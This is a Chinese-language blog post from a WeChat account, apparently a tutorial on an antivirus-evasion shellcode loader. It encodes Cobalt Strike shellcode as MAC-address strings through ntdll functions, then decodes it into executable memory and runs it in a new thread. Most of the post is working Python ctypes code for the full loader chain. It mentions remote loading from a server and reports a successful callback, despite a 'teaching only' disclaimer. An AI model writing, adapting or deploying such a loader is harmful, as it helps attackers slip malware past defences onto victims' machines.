> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qSs4avStVOIUaAF6Krb-wA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgrV6VtMLpD9AQ5l8TzAMFQHY78lFUY0QnI4D7eRnGxtcLwqWFUoN1WaA/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

前言  

前几天不是研究过 uuid 加载器《[CS 免杀 - UUID 写入内存 (python)](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247484633&idx=1&sn=3b5ada28696949bccf7d5a60bda8ecff&chksm=97743838a003b12e6fefcd90dd4764e13a9e3d1c10473810a6ba13804ba884cf7f5fb588bb81&scene=21#wechat_redirect)》吗，觉得这种加载方式很有意思，通过 api 函数将 uuid 转为二进制写入内存。  

今就突发奇想有没有别的 api 函数有异曲同工之处，我就搁开发手册搜啊，搜 to a binary 搜了半天

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgrQngoDJWVWhIG1Hd3aGzlUoGOTicZXBbb1JueNcoym5qVibFGjeqAsiaCw/640?wx_fmt=png)

嘿还真找着了俩函数

RtlEthernetStringToAddressA 和 RtlEthernetAddressToStringA

发现是操作 **MAC 地址**的，可以将 mac 字符串转换成二进制写入内存，所以就有了本文

MAC 是啥

MAC 地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的 EPROM 一种闪存芯片，通常可以通过程序擦写。IP 地址与 MAC 地址在计算机里都是以二进制表示的，IP 地址是 32 位的，而 MAC 地址则是 48 位（6 个字节）的 。  

转换 MAC

RtlEthernetAddressToStringA  

该函数是 ntdll.dll 库的函数，可以把 mac 地址二进制格式转换为字符串表示

```
\xFC\x48\x83\xE4\xF0\xE8 ====> FC-48-83-E4-F0-E8
```

```
https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetaddresstostringa
```

函数原型：  

```
NTSYSAPI PSTR RtlEthernetAddressToStringA(
  const DL_EUI48 *Addr,
  PSTR           S
);
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgrLjFrx54ERFkPNBAmXWVSj1FlgBLfwv8Hic90JmEnlMFXgGicrs8VGEOA/640?wx_fmt=png)

使用此函数可以将二进制转换为 mac 格式  

注意 6 个字节转换一个 mac 值，\x00 是一个字节

当剩余字节数不满 6 个可添加 \ x00 补充字节数，必须将全部的 shellcode 全部转化为 mac 值

在转换之前，需要一块内存用来接收 mac 值

由于我们转换成 mac 后，6 个字节变成了 17 个字节，所以需内存大小自己算一下

```
shellcode = b'\xfc\x48\x83\xe4...'
macmem = ctypes.windll.kernel32.VirtualAlloc(0,len(shellcode)/6*17,0x3000,0x40)
```

然后每隔六个字节进行一次转换，此时内存地址递增 17  

```
for i in range(len(shellcode)/6):
     bytes_a = shellcode[i*6:6+i*6]
     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*17)
```

这时可以看看内存中的值，是否是 mac 字符串形式  

```
a = ctypes.string_at(macmem,len(shellcode)*3-1)
print(a)
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgre5ZkMNrJRHaGiccsVWGv7c4UibT9iamr57fFwu7ttqnRf4YnH7OPTCzbg/640?wx_fmt=png)

转换成 mac 字符串后，可以进一步转换成列表，或者复制下来放在服务器远程加载  

```
list = []
for i in range(len(shellcode)/6):
    d = ctypes.string_at(macmem+i*17,17)
    list.append(d)
print(list)
```

MAC 写入内存

下面已经将 shellcode 转为了 MAC，并放在列表中  

```
import ctypes

list = ['FC-48-83-E4-F0-E8', 'C8-00-00-00-41-51', '41-50-52-51-56-48', '31-D2-65-48-8B-52', '60-48-8B-52-18-48'......]
```

RtlEthernetStringToAddressA

该函数是 ntdll.dll 库的函数，将 MAC 值从字符串形式转为二进制格式

```
FC-48-83-E4-F0-E8 ====> \xFC\x48\x83\xE4\xF0\xE8
```

```
https://docs.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlethernetstringtoaddressa
```

函数原型  

```
NTSYSAPI NTSTATUS RtlEthernetStringToAddressA(
  PCSTR    S,
  PCSTR    *Terminator,
  DL_EUI48 *Addr
);
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgrbTcKiaibBx2L6D7vMb2oWbp1ZA3QrOZJDV8Wwat0NG9etibiaa2ibNN5oEw/640?wx_fmt=png)

一二参数传入 mac 值，第三参数传入接收的内存指针  

```
ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac,mac, ptr)
```

申请内存，注意申请内存的大小 len(list)*6 有多少 mac 值，它的 6 倍就是需要的内存大小  

```
ptr = ctypes.windll.kernel32.VirtualAlloc(0,len(list)*6,0x3000,0x04)
```

通过 RtlEthernetStringToAddressA 函数，将 mac 值转为二进制写入内存  

rwxpage 是内存指针，表示从该指针位置写入

rwxpage+=6 是控制指针的位置，每写入一个 mac 二进制需要将指针移动 6 个字节

```
rwxpage = ptr
for i in range(len(list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(list[i], list[i], rwxpage)
    rwxpage += 6
```

然后创建线程运行即可  

```
ctypes.windll.kernel32.VirtualProtect(ptr, len(list)*6, 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
```

测试

使用 py2.7 环境，CS 生成的 64 位 shellcode  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOia5j6Pszflu8PQsUtkvOgrHfEkTPRH4sn8wHibVVTtba6F0tiaDWLlhickGXt1c2eSXGQjSoo3WyIXA/640?wx_fmt=png)

成功上线，免杀没有测试，主要是研究姿势  

公众号

源码公众号回复：**mac 加载器**